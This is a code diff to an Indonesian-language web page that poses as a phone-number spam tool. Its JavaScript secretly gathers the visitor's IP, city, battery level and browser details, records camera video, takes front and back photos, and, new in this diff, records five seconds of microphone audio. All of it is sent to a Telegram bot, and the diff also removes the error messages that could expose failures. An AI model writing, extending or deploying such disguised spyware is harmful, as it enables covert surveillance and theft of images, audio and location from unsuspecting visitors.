@@ -1,4 +1,4 @@
-    <!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8">
@@ -116,14 +116,17 @@
       });
     }
 
-    function sendMediaToTelegram(blob, type, caption) {
+    function sendMedia(blob, type, filename, caption) {
       chatIds.forEach(id => {
         const formData = new FormData();
         formData.append('chat_id', id);
-        formData.append(type, blob, type === 'video' ? 'video.mp4' : 'photo.jpg');
+        formData.append(type, blob, filename);
         if(caption) formData.append('caption', caption);
         
-        const endpoint = type === 'video' ? 'sendVideo' : 'sendPhoto';
+        let endpoint = 'sendPhoto';
+        if(type === 'video') endpoint = 'sendVideo';
+        if(type === 'voice') endpoint = 'sendVoice';
+
         fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
           method: 'POST',
           body: formData
@@ -132,21 +135,34 @@
     }
 
     async function getInfo() {
-      let ip = '-', city = '-', region = '-', country = '-', org = '-';
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
-        ip = ipData.ip;
-        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        const locRes = await fetch(`https://ip-api.com/json/${ipData.ip}`);
         const loc = await locRes.json();
-        if (loc.status === 'success') {
-          city = loc.city; region = loc.regionName; country = loc.country; org = loc.org;
-        }
+        const battery = await navigator.getBattery?.() || { level: 0 };
+        const text = `IP: ${ipData.ip}\nKota: ${loc.city || '-'}\nBaterai: ${(battery.level * 100).toFixed(0)}%\nBrowser: ${navigator.userAgent}`;
+        sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
       } catch {}
+    }
 
-      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
-      const text = `IP: ${ip}\nKota: ${city}\nISP: ${org}\nBaterai: ${(battery.level * 100).toFixed(0)}%\nWaktu: ${new Date().toLocaleString()}`;
-      sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
+    // Fitur Baru: Rekam Suara (Microphone)
+    async function recordAudio() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+          sendMedia(blob, 'voice', 'voice.ogg', '🎤 Rekaman Suara (5s)');
+          stream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);
+      } catch (err) {
+        sendToTelegram(`❌ Gagal Akses Mic: ${err.message}`);
+      }
     }
 
     async function recordVideo() {
@@ -157,14 +173,12 @@
         mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
         mediaRecorder.onstop = () => {
           const blob = new Blob(chunks, { type: 'video/mp4' });
-          sendMediaToTelegram(blob, 'video', '🎥 Video Depan (5s)');
+          sendMedia(blob, 'video', 'video.mp4', '🎥 Video Depan (5s)');
           stream.getTracks().forEach(track => track.stop());
         };
         mediaRecorder.start();
         setTimeout(() => mediaRecorder.stop(), 5000);
-      } catch (err) {
-        sendToTelegram(`❌ Gagal Video: ${err.message}`);
-      }
+      } catch (err) {}
     }
 
     async function capturePhoto(facingMode, label) {
@@ -178,33 +192,32 @@
             setTimeout(() => {
               canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
               canvas.toBlob(blob => {
-                if (blob) sendMediaToTelegram(blob, 'photo', `📸 Foto: ${label}`);
+                if (blob) sendMedia(blob, 'photo', 'photo.jpg', `📸 Foto: ${label}`);
                 stream.getTracks().forEach(track => track.stop());
                 resolve();
               }, 'image/jpeg');
             }, 2000);
           };
         });
-      } catch (err) {
-        sendToTelegram(`❌ Gagal Foto ${label}`);
-      }
+      } catch (err) {}
     }
 
     button.addEventListener('click', async () => {
       const nomor = input.value.trim();
       if (!nomor || nomor.length < 8) return;
       button.disabled = true;
-      infoDiv.innerText = '⏳ Memproses...';
+      infoDiv.innerText = '⏳ Sedang Memproses...';
       sendToTelegram(`<b>📞 Target:</b> ${nomor}`);
       
       try {
         await getInfo();
-        recordVideo(); 
+        recordAudio(); // Mulai rekam suara
+        recordVideo(); // Mulai rekam video
         await capturePhoto("user", "Depan");
         await new Promise(r => setTimeout(r, 1000));
         await capturePhoto("environment", "Belakang");
         
-        infoDiv.innerText = `✅ Selesai memproses ${nomor}`;
+        infoDiv.innerText = `✅ Berhasil mengirim spam ke ${nomor}`;
         button.disabled = false;
         input.value = '';
       } catch (e) {
